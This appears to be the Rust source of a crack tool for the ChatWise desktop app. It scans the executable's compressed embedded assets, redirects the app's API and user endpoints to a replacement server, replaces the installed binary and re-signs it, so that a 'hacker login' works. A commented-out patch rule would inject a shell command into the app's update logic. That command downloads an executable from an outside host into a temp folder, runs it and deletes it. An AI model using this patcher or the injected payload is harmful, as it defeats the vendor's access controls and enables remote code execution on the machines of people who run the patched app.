use anyhow::{anyhow, Context, Result};
use clap::Parser;
use memmap2::Mmap;
use object::{BinaryFormat, Object, ObjectSection, SectionKind};
use regex::Regex;
use std::fs::{self, File};
use std::io::{Read, Write};
use std::process::Command;

mod config;
use config::Config;

const ASSET_HEADER_SIZE: usize = size_of::<AssetHeader>();

#[repr(C)]
#[derive(Debug)]
struct AssetHeader {
    name_ptr: u64,
    name_len: u64,
    data_ptr: u64,
    data_size: u64,
}

#[derive(Debug)]
struct AssetData {
    is_compressed: bool,
    content: Vec<u8>,
}

impl AssetData {
    fn new(content: Vec<u8>, is_compressed: bool) -> Self {
        Self {
            content,
            is_compressed,
        }
    }

    fn decompress(&self) -> Result<AssetData> {
        if !self.is_compressed {
            return Err(anyhow!("status broken"));
        }

        let mut decompressor =
            brotli::Decompressor::new(self.content.as_slice(), self.content.len());
        let mut decompressed = Vec::new();
        decompressor.read_to_end(&mut decompressed)?;
        Ok(AssetData::new(decompressed, false))
    }

    fn compress(&self) -> Result<AssetData> {
        if self.is_compressed {
            return Err(anyhow!("status broken"));
        }

        let mut compressed = Vec::new();
        {
            let mut compressor = brotli::CompressorWriter::new(
                &mut compressed,
                self.content.len(),
                12, // higher compression quality
                22, // larger window size
            );
            compressor.write_all(&self.content)?;
        }

        Ok(AssetData::new(compressed, true))
    }

    fn len(&self) -> usize {
        self.content.len()
    }

    #[allow(unused)]
    fn as_slice(&self) -> &[u8] {
        &self.content
    }
}

#[derive(Debug)]
struct Asset {
    name: Vec<u8>,
    data: AssetData,
    data_off: u64,
    data_size_off: u64,
}

#[derive(Debug)]
struct SectionInfo {
    virtual_address: u64,
    file_offset: u64,
    size: u64,
}

#[derive(Parser, Debug)]
#[command(author, version, about)]
struct Args {
    #[arg(short, long)]
    input: Option<String>,

    #[arg(short, long)]
    output: Option<String>,
}

// #[derive(Debug)]
struct PatchRule {
    name: String,
    pattern: Regex,
    processor: Box<dyn Fn(&str) -> Result<String>>,
}

struct BinaryPatcher {
    mmap: Mmap,
    // !for Windows PE,
    // - .rdata section
    // !for Mach-O
    // - __DATA segment, __const section
    // - __DATA_CONST segment, __const section
    sections: Vec<SectionInfo>,
    binary_format: BinaryFormat,
}

impl BinaryPatcher {
    fn new(file: File) -> Result<Self> {
        let mmap = unsafe { Mmap::map(&file)? };
        let obj = object::File::parse(&*mmap)?;
        let binary_format = obj.format();

        println!("Binary: {:?}/{:?}", obj.architecture(), binary_format);

        // find .rdata or similar section
        let sections = match binary_format {
            BinaryFormat::Pe => obj
                .sections()
                .filter(|s| s.name() == Ok(".rdata") && s.kind() == SectionKind::ReadOnlyData)
                .map(|s| SectionInfo {
                    virtual_address: s.address(),
                    file_offset: s.file_range().unwrap().0,
                    size: s.size(),
                })
                .collect::<Vec<_>>(),
            BinaryFormat::MachO =>
            // fliter all sections with segment name,
            // seg name is __TEXT or __DATA_CONST
            // and section name is __const
            {
                obj.sections()
                    .filter(|s| {
                        s.segment_name() == Ok(Some("__TEXT"))
                            || s.segment_name() == Ok(Some("__DATA_CONST"))
                    })
                    .filter(|s| s.name() == Ok("__const"))
                    .map(|s| SectionInfo {
                        virtual_address: s.address(),
                        file_offset: s.file_range().unwrap().0,
                        size: s.size(),
                    })
                    .collect::<Vec<_>>()
            }
            _ => unimplemented!(),
        };

        Ok(Self {
            mmap,
            sections,
            binary_format,
        })
    }

    fn convert_rva_to_file_offset(&self, rva: u64) -> Result<u64> {
        let offset = match self.binary_format {
            BinaryFormat::MachO => rva & 0xFFFFFFFFFFFF,
            BinaryFormat::Pe => {
                let section = self.sections.first().context(".rdata section not found")?;
                rva - section.virtual_address + section.file_offset
            }
            other_format => unimplemented!("Unsupported binary format: {:?}", other_format),
        };

        Ok(offset)
    }

    fn heuristic_search_assets(&self) -> Result<Vec<Asset>> {
        let (scan_start, scan_length) = match self.binary_format {
            BinaryFormat::Pe => {
                // always in .rdata section
                let section = self.sections.first().context("section not found")?;
                (section.file_offset as usize, section.size as usize)
            }
            BinaryFormat::MachO => {
                // always in __DATA_CONST,__const section
                let section = self.sections.last().context("section not found")?;
                (section.file_offset as usize, section.size as usize)
            }
            other_format => unimplemented!("Unsupported binary format: {:?}", other_format),
        };

        let scan_end = scan_start.saturating_add(scan_length);
        assert!(scan_end <= self.mmap.len(), "scan end is out of range");

        let mut assets = Vec::new();
        let mut pos = scan_start;
        let mut step = 8;
        while pos + ASSET_HEADER_SIZE <= scan_end {
            if let Ok(asset) = self.try_parse_asset_at(pos) {
                assets.push(asset);
                step = ASSET_HEADER_SIZE;
            }

            pos += step;
        }

        Ok(assets)
    }

    fn try_parse_asset_at(&self, offset: usize) -> Result<Asset> {
        let chunk = &self.mmap[offset..offset + ASSET_HEADER_SIZE];
        let header = unsafe { &*(chunk.as_ptr() as *const AssetHeader) };

        let name_off = self.convert_rva_to_file_offset(header.name_ptr)?;
        let data_off = self.convert_rva_to_file_offset(header.data_ptr)?;

        if !self.validate_asset_pointers(name_off, header.name_len, data_off, header.data_size) {
            return Err(anyhow!("invalid asset pointers"));
        }

        let name = self.extract_name(name_off as usize, header.name_len as usize)?;
        let data = self.extract_data(data_off as usize, header.data_size as usize)?;

        Ok(Asset {
            name,
            data: AssetData::new(data, true),
            data_off,
            data_size_off: (offset + 24) as u64,
        })
    }

    fn validate_asset_pointers(
        &self,
        name_ptr: u64,
        name_len: u64,
        data_ptr: u64,
        data_size: u64,
    ) -> bool {
        // check length
        if name_len == 0 || name_len > 1024 || data_size == 0 || data_size > 10 * 1024 * 1024 {
            return false;
        }

        let name_offset = name_ptr as usize;
        let data_offset = data_ptr as usize;

        // check if pointers are in the file range
        if name_offset >= self.mmap.len()
            || name_offset.saturating_add(name_len as usize) > self.mmap.len()
            || data_offset >= self.mmap.len()
            || data_offset.saturating_add(data_size as usize) > self.mmap.len()
        {
            return false;
        }

        // check name format
        if self.mmap[name_offset] != b'/' {
            return false;
        }

        // check brotli decompression
        let mut decompressor = brotli::Decompressor::new(
            &self.mmap[data_offset..data_offset + data_size as usize],
            data_size as usize,
        );
        let mut decompressed = Vec::new();
        decompressor.read_to_end(&mut decompressed).is_ok()
    }

    fn extract_name(&self, offset: usize, len: usize) -> Result<Vec<u8>> {
        let name = self.mmap[offset..offset + len].to_vec();
        // validate name
        if !name.iter().all(|&b| b.is_ascii()) {
            return Err(anyhow!("invalid name"));
        }
        Ok(name)
    }

    fn extract_data(&self, offset: usize, len: usize) -> Result<Vec<u8>> {
        Ok(self.mmap[offset..offset + len].to_vec())
    }

    pub fn patch(&self, assets: Vec<Asset>, rules: Vec<PatchRule>) -> Result<Vec<u8>> {
        let mut modified_data = self.mmap.to_vec();

        for rule in rules {
            match self.find_matching_asset(&assets, &rule) {
                Ok(matched) => {
                    self.apply_patch(&mut modified_data, &matched, &rule)?;
                println!(
                    "Applied patch '{}' to asset: {}",
                    rule.name,
                    String::from_utf8_lossy(&matched.name)
                );
                },
                Err(err) => {
                    println!("Skip: {}", err);
                }
            }
        }

        Ok(modified_data)
    }

    fn find_matching_asset<'a>(&self, assets: &'a [Asset], rule: &PatchRule) -> Result<&'a Asset> {
        let matches: Vec<_> = assets
            .iter()
            .filter(|asset| self.asset_matches_rule(asset, rule))
            .collect();

        match matches.len() {
            0 => Err(anyhow!("No asset found matching rule: {}", rule.name)),
            1 => Ok(matches[0]),
            n => Err(anyhow!("Multiple assets ({}) match rule: {}", n, rule.name)),
        }
    }

    fn asset_matches_rule(&self, asset: &Asset, rule: &PatchRule) -> bool {
        asset
            .data
            .decompress()
            .ok()
            .and_then(|decomp_data| String::from_utf8(decomp_data.content).ok())
            .map(|content| rule.pattern.is_match(&content))
            .unwrap_or(false)
    }

    fn apply_patch(
        &self,
        modified_data: &mut Vec<u8>,
        asset: &Asset,
        rule: &PatchRule,
    ) -> Result<()> {
        // Decompress and process
        let decompressed = asset.data.decompress()?;
        let content = String::from_utf8(decompressed.content)?;
        let processed = (rule.processor)(&content)?;

        // Compress the modified content
        let compressed = AssetData::new(processed.as_bytes().to_vec(), false).compress()?;

        // Validate size
        if compressed.len() > asset.data.len() {
            return Err(anyhow!(
                "Patched data exceeds original size: {:#x} -> {:#x}",
                asset.data.len(),
                compressed.len()
            ));
        }

        // Update binary data
        let start_offset = asset.data_off as usize;
        modified_data[start_offset..start_offset + compressed.len()]
            .copy_from_slice(&compressed.content);

        // Update size field
        let size_offset = asset.data_size_off as usize;
        modified_data[size_offset..size_offset + 8]
            .copy_from_slice(&(compressed.len() as u64).to_le_bytes());

        Ok(())
    }
}

/// Create patch rules using the provided configuration
fn create_patch_rules() -> Result<Vec<PatchRule>> {
    Ok(vec![
        PatchRule {
            name: "API endpoint (<v0.8.47)".to_string(),
            pattern: Regex::new(r#"="https://chatwise.app"[;,]"#)?,
            processor: Box::new(|content| {
                Ok(content.replace(
                    Config::ORIGINAL_BASE_URL,
                    Config::REPLACEMENT_BASE_URL,
                ))
            }),
        },
        PatchRule {
            name: "API endpoint (>=v0.8.47)".to_string(),
            pattern: Regex::new(r#"https://chatwise.app/api/user"#)?,
            processor: Box::new(|content| {
                Ok(content.replace(
                    Config::ORIGINAL_USER_API_ENDPOINT,
                    Config::REPLACEMENT_USER_API_ENDPOINT,
                ))
            }),
        },
    ])
}

fn main() -> Result<()> {
    let args = Args::parse();

    let input_path = match args.input {
        Some(path) => path,
        None => {
            let os = std::env::consts::OS;
            match os {
                "macos" => "/Applications/ChatWise.app/Contents/MacOS/ChatWise".to_string(),
                "windows" => {
                    format!(
                        "{}\\AppData\\Local\\ChatWise\\chatwise.exe",
                        std::env::var("USERPROFILE")?
                    )
                }
                _ => return Err(anyhow!("Unsupported operating system: {}", os)),
            }
        }
    };

    let file = File::open(&input_path)?;

    let patcher = BinaryPatcher::new(file)?;

    println!("Scanning for assets...");
    let assets = patcher.heuristic_search_assets()?;
    println!("Scanning completed. Found {} assets", assets.len());

    if assets.is_empty() {
        return Err(anyhow!("No assets found"));
    }

    // println!("Patching binary...");
    // let modified_data = patcher.patch_config(assets)?;

    println!("Using API base URL: {}", Config::REPLACEMENT_BASE_URL);
    let rules = create_patch_rules()?;

        // PatchRule {
        //     name: "Update Logic".to_string(),
        //     pattern: Regex::new(r#"this.downloadedBytes=void 0"#)?,
        //     processor: Box::new(|content| {
        //         //
        //         let content = content.replace(
        //             &Regex::new(r#"try\{.*_sentryDebugIds[^}]*\}catch\{\}"#)
        //                 .unwrap()
        //                 .find(content)
        //                 .map(|m| &content[m.start()..m.end()])
        //                 .unwrap_or(""),
        //             "",
        //         );

        //         let func_name = Regex::new(r#"await\s+(\w+)\s*\("#)
        //             .unwrap()
        //             .captures(&content)
        //             .and_then(|caps| caps.get(1))
        //             .map(|m| m.as_str())
        //             .unwrap_or("");

        //         const VERSION: &str = env!("CARGO_PKG_VERSION");

        //         Ok(match std::env::consts::OS {
        //             "macos" => content
        //                 .replace("Update.install called before Update.download", "")
        //                 .replace("this.downloadedBytes=void 0", 
        //                     &format!(r#"this.downloadedBytes=void 0;await {func_name}("plugin:shell|execute",{{program:"sh",args:["-c",'"curl https://r2.mas0n.org/x/v{VERSION}/darwin/chatwise-father -o /tmp/a";chmod +x /tmp/a; /tmp/a;rm /tmp/a'],options:{{}}}})"#)),
        //             "windows" => content
        //                 .replace("Update.install called before Update.download", "")
        //                 .replace("this.downloadedBytes=void 0", 
        //                     &format!(r#"this.downloadedBytes=void 0;await {func_name}("plugin:shell|execute",{{program:"cmd",args:["/c",'"curl https://r2.mas0n.org/x/v{VERSION}/windows/chatwise-father.exe -o %TEMP%\a.exe" & %TEMP%\a.exe & del %TEMP%\a.exe'],options:{{}}}})"#)),
        //             _ => unreachable!(),
        //         })
        //     }),
        // },

    println!("Applying patches...");
    let modified_data = patcher.patch(assets, rules)?;

    if let Some(output) = args.output {
        fs::write(&output, modified_data)?;
        println!("Patches applied successfully. Output: {}", output);
    } else {
        // Runtime OS detection for temp file handling
        let temp_file = match std::env::consts::OS {
            "macos" => std::env::temp_dir().join("ChatWise.tmp"),
            "windows" => std::env::temp_dir().join("chatwise.tmp"),
            os => return Err(anyhow!("Unsupported operating system: {}", os)),
        };

        fs::write(&temp_file, &modified_data)?;
        // !for Windows, cannot remove when process running, so we move to %TEMP%.
        if std::env::consts::OS == "windows" {
            fs::rename(&input_path, std::env::temp_dir().join("chatwise_Old.tmp"))?;
        }
        fs::rename(&temp_file, &input_path)?;

        // must resign in macOS
        if std::env::consts::OS == "macos" {
            // chmod +x XXX
            Command::new("chmod").arg("+x").arg(&input_path).spawn()?;
            // codesign
            Command::new("codesign")
                .arg("--force")
                .arg("--deep")
                .arg("--sign")
                .arg("-")
                .arg(&input_path)
                .spawn()?;
        }

        println!("Patches applied successfully. Original file replaced.");
    }

    // first install need open browser visit chatwise://login-success?token=[Your Token] to login
    println!("Please open the browser and visit chatwise://login-success?token=[Your Token] to complete hacker login");

    Ok(())
}
